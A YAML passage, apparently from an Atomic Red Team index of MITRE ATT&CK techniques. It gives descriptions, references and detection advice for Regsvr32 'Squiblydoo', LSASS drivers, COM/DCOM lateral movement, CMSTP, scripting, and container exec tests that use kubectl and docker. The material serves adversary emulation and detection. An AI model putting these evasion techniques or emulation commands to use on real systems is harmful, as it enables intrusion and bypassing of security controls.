      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--68f7e3a1-f09f-4164-9a62-16b648a0dd5a
      type: attack-pattern
      created: '2017-05-31T21:31:26.966Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1117
        url: https://attack.mitre.org/techniques/T1117
      - source_name: Microsoft Regsvr32
        description: Microsoft. (2015, August 14). How to use the Regsvr32 tool and
          troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.
        url: https://support.microsoft.com/en-us/kb/249873
      - source_name: LOLBAS Regsvr32
        url: https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/
        description: LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019.
      - source_name: Carbon Black Squiblydoo Apr 2016
        description: 'Nolen, R. et al.. (2016, April 28). Threat Advisory: “Squiblydoo?
          Continues Trend of Attackers Using Native OS Tools to “Live off the Land?.
          Retrieved April 9, 2018.'
        url: https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/
      - url: https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html
        description: Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing
          Techniques Used in Attacks Targeting the Mongolian Government. Retrieved
          February 24, 2017.
        source_name: FireEye Regsvr32 Targeting Mongolian Gov
      modified: '2020-01-31T19:00:56.475Z'
      name: Regsvr32
      description: |-
        Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe can be used to execute arbitrary binaries. (Citation: Microsoft Regsvr32)

        Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of whitelists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe is also a Microsoft signed binary.

        Regsvr32.exe can also be used to specifically bypass process whitelisting using functionality to load COM scriptlets to execute DLLs under user permissions. Since regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)

        Regsvr32.exe can also be leveraged to register a COM Object used to establish Persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1122). (Citation: Carbon Black Squiblydoo Apr 2016)
      kill_chain_phases:
      - phase_name: defense-evasion
        kill_chain_name: mitre-attack
      - phase_name: execution
        kill_chain_name: mitre-attack
      x_mitre_detection: 'Use process monitoring to monitor the execution and arguments
        of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history
        of known good arguments and loaded files to determine anomalous and potentially
        adversarial activity. Command arguments used before and after the regsvr32.exe
        invocation may also be useful in determining the origin and purpose of the
        script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)'
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Process whitelisting
      - Anti-virus
      - Digital Certificate Validation
      x_mitre_permissions_required:
      - User
      - Administrator
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1177:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Vincent Le Toux
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--6e6845c2-347a-4a6f-a2d1-b74a18ebd352
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1177
        url: https://attack.mitre.org/techniques/T1177
      - url: https://technet.microsoft.com/library/cc961760.aspx
        description: Microsoft. (n.d.). Security Subsystem Architecture. Retrieved
          November 27, 2017.
        source_name: Microsoft Security Subsystem
      - url: https://technet.microsoft.com/library/dn408187.aspx
        description: Microsoft. (2014, March 12). Configuring Additional LSA Protection.
          Retrieved November 27, 2017.
        source_name: Microsoft LSA Protection Mar 2014
      - url: https://technet.microsoft.com/en-us/sysinternals/bb963902
        description: Russinovich, M. (2016, January 4). Autoruns for Windows v13.51.
          Retrieved June 6, 2016.
        source_name: TechNet Autoruns
      - url: https://msdn.microsoft.com/library/windows/desktop/ff919712.aspx
        description: Microsoft. (n.d.). Dynamic-Link Library Security. Retrieved November
          27, 2017.
        source_name: Microsoft DLL Security
      modified: '2020-01-24T18:50:28.846Z'
      name: LSASS Driver
      description: |-
        The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)

        Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., [DLL Side-Loading](https://attack.mitre.org/techniques/T1073) or [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038)), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: persistence
      x_mitre_detection: |-
        With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014)

        Utilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA.

        Utilize the Sysinternals Process Monitor utility to monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1059:
    technique:
      modified: '2023-03-27T16:43:58.795Z'
      name: Command and Scripting Interpreter
      description: |-
        Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of [Unix Shell](https://attack.mitre.org/techniques/T1059/004) while Windows installations include the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).

        There are also cross-platform interpreters such as [Python](https://attack.mitre.org/techniques/T1059/006), as well as those commonly associated with client applications such as [JavaScript](https://attack.mitre.org/techniques/T1059/007) and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).

        Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in [Initial Access](https://attack.mitre.org/tactics/TA0001) payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various [Remote Services](https://attack.mitre.org/techniques/T1021) in order to achieve remote Execution.(Citation: Powershell Remote Commands)(Citation: Cisco IOS Software Integrity Assurance - Command History)(Citation: Remote Shell Execution in Python)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Command-line and scripting activities can be captured through proper logging of process execution with command-line arguments. This information can be useful in gaining additional insight to adversaries' actions through how they use native processes or custom tools. Also monitor for loading of modules associated with specific languages.

        If scripting is restricted for normal users, then any attempt to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

        Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information discovery, collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - Network
      - Office 365
      - Azure AD
      - IaaS
      - Google Workspace
      x_mitre_version: '2.4'
      x_mitre_data_sources:
      - 'Module: Module Load'
      - 'Process: Process Metadata'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      - 'Script: Script Execution'
      x_mitre_remote_support: true
      type: attack-pattern
      id: attack-pattern--7385dfaf-6886-4229-9ecd-6fd678040830
      created: '2017-05-31T21:30:49.546Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1059
        external_id: T1059
      - source_name: Remote Shell Execution in Python
        description: Abdou Rockikz. (2020, July). How to Execute Shell Commands in
          a Remote Machine in Python. Retrieved July 26, 2021.
        url: https://www.thepythoncode.com/article/executing-bash-commands-remotely-in-python
      - source_name: Cisco IOS Software Integrity Assurance - Command History
        description: Cisco. (n.d.). Cisco IOS Software Integrity Assurance - Command
          History. Retrieved October 21, 2020.
        url: https://tools.cisco.com/security/center/resources/integrity_assurance.html#23
      - source_name: Powershell Remote Commands
        description: Microsoft. (2020, August 21). Running Remote Commands. Retrieved
          July 26, 2021.
        url: https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.1
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1175:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--772bc7a8-a157-42cc-8728-d648e25c7fe7
      type: attack-pattern
      created: '2018-01-16T16:13:52.465Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        external_id: T1175
        url: https://attack.mitre.org/techniques/T1175
      - source_name: Fireeye Hunting COM June 2019
        url: https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html
        description: Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June
          10, 2019.
      - url: https://msdn.microsoft.com/library/windows/desktop/ms680573.aspx
        description: Microsoft. (n.d.). Component Object Model (COM). Retrieved November
          22, 2017.
        source_name: Microsoft COM
      - url: https://docs.microsoft.com/en-us/windows/desktop/com/dcom-security-enhancements-in-windows-xp-service-pack-2-and-windows-server-2003-service-pack-1
        description: Microsoft. (n.d.). DCOM Security Enhancements in Windows XP Service
          Pack 2 and Windows Server 2003 Service Pack 1. Retrieved November 22, 2017.
        source_name: Microsoft COM ACL
      - url: https://msdn.microsoft.com/en-us/library/windows/desktop/ms687317(v=vs.85).aspx
        description: Microsoft. (n.d.). Setting Process-Wide Security Through the
          Registry. Retrieved November 21, 2017.
        source_name: Microsoft Process Wide Com Keys
      - url: https://msdn.microsoft.com/en-us/library/windows/desktop/ms694331(v=vs.85).aspx
        description: Microsoft. (n.d.). Registry Values for System-Wide Security.
          Retrieved November 21, 2017.
        source_name: Microsoft System Wide Com Keys
      - url: https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html
        description: 'Forshaw, J. (2018, April 18). Windows Exploitation Tricks: Exploiting
          Arbitrary File Writes for Local Elevation of Privilege. Retrieved May 3,
          2018.'
        source_name: ProjectZero File Write EoP Apr 2018
      - url: https://enigma0x3.net/2017/11/16/lateral-movement-using-outlooks-createobject-method-and-dotnettojscript/
        description: Nelson, M. (2017, November 16). Lateral Movement using Outlook's
          CreateObject Method and DotNetToJScript. Retrieved November 21, 2017.
        source_name: Enigma Outlook DCOM Lateral Movement Nov 2017
      - url: https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
        description: Nelson, M. (2017, January 5). Lateral Movement using the MMC20
          Application COM Object. Retrieved November 21, 2017.
        source_name: Enigma MMC20 COM Jan 2017
      - url: https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/
        description: 'Nelson, M. (2017, January 23). Lateral Movement via DCOM: Round
          2. Retrieved November 21, 2017.'
        source_name: Enigma DCOM Lateral Movement Jan 2017
      - url: https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/
        description: Nelson, M. (2017, September 11). Lateral Movement using Excel.Application
          and DCOM. Retrieved November 21, 2017.
        source_name: Enigma Excel DCOM Sept 2017
      - url: https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom
        description: Tsukerman, P. (2017, November 8). Leveraging Excel DDE for lateral
          movement via DCOM. Retrieved November 21, 2017.
        source_name: Cyberreason DCOM DDE Lateral Movement Nov 2017
      modified: '2020-03-30T13:36:10.069Z'
      name: Component Object Model and Distributed COM
      description: "**This technique has been deprecated. Please use [Distributed
        Component Object Model](https://attack.mitre.org/techniques/T1021/003) and
        [Component Object Model](https://attack.mitre.org/techniques/T1559/001).**\n\nAdversaries
        may use the Windows Component Object Model (COM) and Distributed Component
        Object Model (DCOM) for local code execution or to execute on remote systems
        as part of lateral movement. \n\nCOM is a component of the native Windows
        application programming interface (API) that enables interaction between software
        objects, or executable code that implements one or more interfaces.(Citation:
        Fireeye Hunting COM June 2019) Through COM, a client object can call methods
        of server objects, which are typically Dynamic Link Libraries (DLL) or executables
        (EXE).(Citation: Microsoft COM) DCOM is transparent middleware that extends
        the functionality of Component Object Model (COM) (Citation: Microsoft COM)
        beyond a local computer using remote procedure call (RPC) technology.(Citation:
        Fireeye Hunting COM June 2019)\n\nPermissions to interact with local and remote
        server COM objects are specified by access control lists (ACL) in the Registry.
        (Citation: Microsoft COM ACL)(Citation: Microsoft Process Wide Com Keys)(Citation:
        Microsoft System Wide Com Keys) By default, only Administrators may remotely
        activate and launch COM objects through DCOM.\n\nAdversaries may abuse COM
        for local command and/or payload execution. Various COM interfaces are exposed
        that can be abused to invoke arbitrary execution via a variety of programming
        languages such as C, C++, Java, and VBScript.(Citation: Microsoft COM) Specific
        COM objects also exists to directly perform functions beyond code execution,
        such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053),
        fileless download/execution, and other adversary behaviors such as Privilege
        Escalation and Persistence.(Citation: Fireeye Hunting COM June 2019)(Citation:
        ProjectZero File Write EoP Apr 2018)\n\nAdversaries may use DCOM for lateral
        movement. Through DCOM, adversaries operating in the context of an appropriately
        privileged user can remotely obtain arbitrary and even direct shellcode execution
        through Office applications (Citation: Enigma Outlook DCOM Lateral Movement
        Nov 2017) as well as other Windows objects that contain insecure methods.(Citation:
        Enigma MMC20 COM Jan 2017)(Citation: Enigma DCOM Lateral Movement Jan 2017)
        DCOM can also execute macros in existing documents (Citation: Enigma Excel
        DCOM Sept 2017) and may also invoke [Dynamic Data Exchange](https://attack.mitre.org/techniques/T1173)
        (DDE) execution directly through a COM created instance of a Microsoft Office
        application (Citation: Cyberreason DCOM DDE Lateral Movement Nov 2017), bypassing
        the need for a malicious document."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: lateral-movement
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Monitor for COM objects loading DLLs and other modules not typically associated with the application.(Citation: Enigma Outlook DCOM Lateral Movement Nov 2017) Enumeration of COM objects, via [Query Registry](https://attack.mitre.org/techniques/T1012) or [PowerShell](https://attack.mitre.org/techniques/T1086), may also proceed malicious use.(Citation: Fireeye Hunting COM June 2019)(Citation: Enigma MMC20 COM Jan 2017)

        Monitor for spawning of processes associated with COM objects, especially those invoked by a user different than the one currently logged on.

        Monitor for any influxes or abnormal increases in Distributed Computing Environment/Remote Procedure Call (DCE/RPC) traffic.
      x_mitre_deprecated: true
      x_mitre_version: '2.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_permissions_required:
      - Administrator
      - SYSTEM
      - User
      x_mitre_remote_support: true
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1609:
    technique:
      modified: '2023-04-15T16:03:19.642Z'
      name: Kubernetes Exec Into Container
      description: |-
        Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.(Citation: Docker Daemon CLI)(Citation: Kubernetes API)(Citation: Kubernetes Kubelet)

        In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as <code>docker exec</code> to execute a command within a running container.(Citation: Docker Entrypoint)(Citation: Docker Exec) In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as <code>kubectl exec</code>.(Citation: Kubectl Exec Get Shell)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_contributors:
      - Alfredo Oliveira, Trend Micro
      - David Fiser, @anu4is, Trend Micro
      - Brad Geesaman, @bradgeesaman
      - Center for Threat-Informed Defense (CTID)
      - Magno Logan, @magnologan, Trend Micro
      - Vishwas Manral, McAfee
      - Yossi Weizman, Azure Defender Research Team
      x_mitre_deprecated: false
      x_mitre_detection: 'Container administration service activities and executed
        commands can be captured through logging of process execution with command-line
        arguments on the container and the underlying host. In Docker, the daemon
        log provides insight into events at the daemon and container service level.
        Kubernetes system component logs may also detect activities running in and
        out of containers in the cluster. '
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Containers
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'Command: Command Execution'
      x_mitre_remote_support: true
      type: attack-pattern
      id: attack-pattern--7b50a1d3-4ca7-45d1-989d-a6503f04bfe1
      created: '2021-03-29T16:39:26.183Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1609
        external_id: T1609
      - source_name: Docker Exec
        description: Docker. (n.d.). Docker Exec. Retrieved March 29, 2021.
        url: https://docs.docker.com/engine/reference/commandline/exec/
      - source_name: Docker Entrypoint
        description: Docker. (n.d.). Docker run reference. Retrieved March 29, 2021.
        url: https://docs.docker.com/engine/reference/run/#entrypoint-default-command-to-execute-at-runtime
      - source_name: Docker Daemon CLI
        description: Docker. (n.d.). DockerD CLI. Retrieved March 29, 2021.
        url: https://docs.docker.com/engine/reference/commandline/dockerd/
      - source_name: Kubectl Exec Get Shell
        description: The Kubernetes Authors. (n.d.). Get a Shell to a Running Container.
          Retrieved March 29, 2021.
        url: https://kubernetes.io/docs/tasks/debug-application-cluster/get-shell-running-container/
      - source_name: Kubernetes Kubelet
        description: The Kubernetes Authors. (n.d.). Kubelet. Retrieved March 29,
          2021.
        url: https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/
      - source_name: Kubernetes API
        description: The Kubernetes Authors. (n.d.). The Kubernetes API. Retrieved
          March 29, 2021.
        url: https://kubernetes.io/docs/concepts/overview/kubernetes-api/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1609
    atomic_tests:
    - name: ExecIntoContainer
      auto_generated_guid: d03bfcd3-ed87-49c8-8880-44bb772dea4b
      description: 'Attackers who have permissions, can run malicious commands in
        containers in the cluster using exec command (“kubectl exec?). In this method,
        attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as
        a backdoor container, and run their malicious code remotely by using “kubectl
        exec?.

        '
      supported_platforms:
      - containers
      input_arguments:
        namespace:
          description: K8s namespace to use
          type: string
          default: default
        command:
          description: Command to run
          type: string
          default: uname
        path:
          description: Path to busybox.yaml file
          type: string
          default: "$PathtoAtomicsFolder/T1609/src/busybox.yaml"
      dependencies:
      - description: 'kubectl must be installed

          '
        get_prereq_command: 'echo "kubectl must be installed manually"

          '
        prereq_command: 'which kubectl

          '
      executor:
        command: |
          kubectl create -f #{path} -n #{namespace}
          # wait 3 seconds for the instance to come up
          sleep 3
          kubectl exec -n #{namespace} busybox -- #{command}
        cleanup_command: 'kubectl delete pod busybox -n #{namespace}

          '
        name: bash
        elevation_required: false
    - name: Docker Exec Into Container
      auto_generated_guid: 900e2c49-221b-42ec-ae3c-4717e41e6219
      description: 'Attackers who have permissions, can run malicious commands in
        containers in the cluster using exec command (“docker exec?). In this method,
        attackers can use legitimate images, such as an OS image (e.g., Ubuntu) as
        a backdoor container, and run their malicious code remotely by using “docker
        exec?. Kinsing (Golang-based malware) was executed with an Ubuntu container
        entry point that runs shell scripts.

        '
      supported_platforms:
      - containers
      dependencies:
      - description: 'docker must be installed

          '
        get_prereq_command: 'if [ "" == "`which docker`" ]; then echo "Docker Not
          Found"; if [ -n "`which apt-get`" ]; then sudo apt-get -y install docker
          ; elif [ -n "`which yum`" ]; then sudo yum -y install docker ; fi ; else
          echo "Docker installed"; fi

          '
        prereq_command: 'which docker

          '
      executor:
        command: "docker build -t t1609  $PathtoAtomicsFolder/T1609/src/ \ndocker
          run --name t1609_container --rm -itd t1609 bash /tmp/script.sh\ndocker exec
          -i t1609_container bash -c \"cat /tmp/output.txt\"\n"
        cleanup_command: "docker stop t1609_container\ndocker rmi -f t1609:latest
          \n"
        name: bash
        elevation_required: false
  T1191:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Ye Yint Min Thu Htut, Offensive Security Team, DBS Bank
      - Nik Seetharaman, Palantir
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--7d6f590f-544b-45b4-9a42-e0805f342af3
      type: attack-pattern
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1191
        url: https://attack.mitre.org/techniques/T1191
      - url: https://docs.microsoft.com/previous-versions/windows/it-pro/windows-server-2003/cc786431(v=ws.10)
        description: Microsoft. (2009, October 8). How Connection Manager Works. Retrieved
          April 11, 2018.
        source_name: Microsoft Connection Manager Oct 2009
      - source_name: Twitter CMSTP Usage Jan 2018
        description: Carr, N. (2018, January 31). Here is some early bad cmstp.exe...
          Retrieved April 11, 2018.
        url: https://twitter.com/ItsReallyNick/status/958789644165894146
      - url: https://msitpros.com/?p=3960
        description: Moe, O. (2017, August 15). Research on CMSTP.exe. Retrieved April
          11, 2018.
        source_name: MSitPros CMSTP Aug 2017
      - url: https://twitter.com/NickTyrer/status/958450014111633408
        description: Tyrer, N. (2018, January 30). CMSTP.exe - remote .sct execution
          applocker bypass. Retrieved April 11, 2018.
        source_name: Twitter CMSTP Jan 2018
      - url: https://github.com/api0cradle/UltimateAppLockerByPassList
        description: Moe, O. (2018, March 1). Ultimate AppLocker Bypass List. Retrieved
          April 10, 2018.
        source_name: GitHub Ultimate AppLocker Bypass List
      - source_name: Endurant CMSTP July 2018
        description: Seetharaman, N. (2018, July 7). Detecting CMSTP-Enabled Code
          Execution and UAC Bypass With Sysmon.. Retrieved August 6, 2018.
        url: http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/
      modified: '2020-01-31T18:58:17.078Z'
      name: CMSTP
      description: |-
        The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

        Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https://attack.mitre.org/techniques/T1117) / ?Squiblydoo?, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other whitelisting defenses since CMSTP.exe is a legitimate, signed Microsoft application.

        CMSTP.exe can also be abused to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.

        Sysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: (Citation: Endurant CMSTP July 2018)

        * To detect loading and execution of local/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.
        * To detect [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Application whitelisting
      - Anti-virus
      x_mitre_permissions_required:
      - User
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1064:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--7fd87010-3a00-4da3-b905-410525e8ec44
      type: attack-pattern
      created: '2017-05-31T21:30:51.733Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        external_id: T1064
        url: https://attack.mitre.org/techniques/T1064
      - source_name: Metasploit_Ref
        description: Metasploit. (n.d.). Retrieved December 4, 2014.
        url: http://www.metasploit.com
      - url: https://www.veil-framework.com/framework/
        description: Veil Framework. (n.d.). Retrieved December 4, 2014.
        source_name: Veil_Ref
      - url: https://github.com/mattifestation/PowerSploit
        description: PowerSploit. (n.d.). Retrieved December 4, 2014.
        source_name: Powersploit
      - url: https://blog.crowdstrike.com/deep-thought-chinese-targeting-national-security-think-tanks/
        description: 'Alperovitch, D. (2014, July 7). Deep in Thought: Chinese Targeting
          of National Security Think Tanks. Retrieved November 12, 2014.'
        source_name: Alperovitch 2014
      - url: https://www.uperesia.com/analyzing-malicious-office-documents
        description: Felix. (2016, September). Analyzing Malicious Office Documents.
          Retrieved April 11, 2018.
        source_name: Uperesia Malicious Office Documents
      modified: '2020-03-30T13:39:24.852Z'
      name: Scripting
      description: |-
        **This technique has been deprecated. Please use [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) where appropriate.**

        Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and [PowerShell](https://attack.mitre.org/techniques/T1086) but could also be in the form of command-line batch scripts.

        Scripts can be embedded inside Office documents as macros that can be set to execute when files used in [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) and other types of spearphishing are opened. Malicious embedded macros are an alternative means of execution than software exploitation through [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), where adversaries will rely on macros being allowed or that the user will accept to activate them.

        Many popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), and PowerSploit (Citation: Powersploit) are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell. (Citation: Alperovitch 2014)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.

        Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information Discovery, Collection, or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.

        Analyze Office file attachments for potentially malicious macros. Execution of macros may create suspicious process trees depending on what the macro is designed to do. Office processes, such as winword.exe, spawning instances of cmd.exe, script application like wscript.exe or powershell.exe, or other suspicious processes may indicate malicious activity. (Citation: Uperesia Malicious Office Documents)
      x_mitre_deprecated: true
      x_mitre_version: '1.0'
